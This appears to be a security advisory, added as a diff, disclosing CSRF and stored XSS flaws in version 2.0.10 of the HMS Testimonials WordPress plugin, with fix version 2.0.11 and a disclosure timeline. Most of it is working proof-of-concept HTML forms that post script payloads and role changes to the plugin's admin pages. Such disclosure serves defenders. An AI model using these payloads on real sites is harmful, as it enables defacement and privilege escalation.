@@ -1,0 +1,102 @@
+Update
+========================
+Fixed wrong dates.
+
+Details
+========================
+Application: HMS Testimonials ( http://wordpress.org/plugins/hms-testimonials/ )
+Version: 2.0.10
+Type: Wordpress Plugin
+Vendor: Jeff Kreitner ( http://profiles.wordpress.org/kreitje/ )
+Vulnerability:
+- Cross-Site Request Forgery (CWE-352)
+- Cross-Site Scripting (CWE-79)
+
+Description
+========================
+Display your customer testimonials on pages or posts. Use groups to organize and display specific testimonnials on specific pages.
+
+Vulnerability
+========================
+This plugin is vulnerable to CSRF on all forms, as well as XSS on some of them
+
+1. Testimonials is vulnerable to CSRF and XSS
+2. Group is vulnerable to CSRF
+3. Settings
+3.1. Default is vulnerable to CSRF
+3.2. Advanced is vulnerable to CSRF
+3.3. Custom Fields is vulnerable to CSRF and XSS
+3.4. Templates is vulnerable to CSRF and XSS
+
+This can be used in many different ways, like defacement of both public site and the admin area (only the HMS Testimonials plugin area will be affected), modify settings to set a lower role as moderator (very harmful on sites with open registrations), etc.
+
+Proof of Concept
+========================
+1. Testimonial
+<form method="post" action="http://wordpress/wp-admin/admin.php?page=hms-testimonials-addnew">
+    <input type="hidden" name="name" value="<script>alert('xss')</script>">
+    <input type="hidden" name="image" value="<script>alert('xss')</script>">
+    <input type="hidden" name="testimonial_date" value="08/08/2013">
+    <input type="hidden" name="url" value="<script>alert(String.fromCharCode(88,83,83))</script>">
+    <input type="hidden" name="testimonial" value="<script>alert('xss')</script>">
+    <input type="hidden" name="display" value="1">
+    <input type="submit" name="save" value="Save Testimonial">
+</form>
+
+2. Group
+<form method="post" action="http://wordpress/wp-admin/admin.php?page=hms-testimonials-addnewgroup&noheader=true">
+    <input type="hidden" name="name" value="New group">
+    <input type="submit" name="save" value="Save Group">
+</form>
+
+3.1. Settings - Default
+<form method="post" action="http://wordpress/wp-admin/admin.php?page=hms-testimonials-settings">
+    <input type="hidden" name="active_links_nofollow" value="1">
+    <input type="hidden" name="image_width" value='100'>
+    <input type="hidden" name="image_height" value='100'>
+    <input type="hidden" name="date_format" value='m/d/Y"><script>alert(3)</script>'>
+    <input type="hidden" name="testimonial_container" value='div'>
+    <input type="hidden" name="recaptcha_publickey" value="">
+    <input type="hidden" name="recaptcha_privatekey" value="">
+    <input type="submit" name="save" value="Save Settings (Default)">
+</form>
+
+3.2. Settings - Advanced
+<form method="post" action="http://wordpress/wp-admin/admin.php?page=hms-testimonials-settings-advanced">
+    <input type="hidden" name="moderator" value="subscriber">
+    <input type="hidden" name="roles" value="subscriber">
+    <input type="hidden" name="num_users_can_create" value="9999">
+    <input type="hidden" name="autoapprove" value="subscriber">
+    <input type="hidden" name="moderators_can_access_settings" value="1">
+    <input type="hidden" name="js_load" value="1">
+    <input type="hidden" name="roleorder[]" value="editor">
+    <input type="hidden" name="roleorder[]" value="author">
+    <input type="hidden" name="roleorder[]" value="contributor">
+    <input type="hidden" name="roleorder[]" value="subscriber">
+    <input type="submit" name="save" value="Save Settings (Advanced)">
+</form>
+
+3.3. Settings - Custom Fields
+<form method="post" action="http://wordpress/wp-admin/admin.php?page=hms-testimonials-settings-fields">
+    <input type="hidden" name="name" value="xss">
+    <input type="hidden" name="type" value="textarea">
+    <input type="hidden" name="showonform" value="1">
+    <input type="submit" name="save" value="Save Settings (Custom Fields)">
+</form>
+
+3.4. Settings - Template
+<form method="post" action="http://wordpress/wp-admin/admin.php?page=hms-testimonials-templates-new">
+    <input type="hidden" name="name" value="New template<script>alert('xss')</script>">
+    <input type="hidden" name="item[]" value="system_id">
+    <input type="submit" name="save" value="Settings Templates (Save)">
+</form>
+
+Solution
+========================
+Update to HMS Testimonials 2.0.11
+
+Timeline
+========================
+2013-09-08 - Contacted developer with details
+2013-09-08 - Fix released
+2013-09-08 - Disclosed public
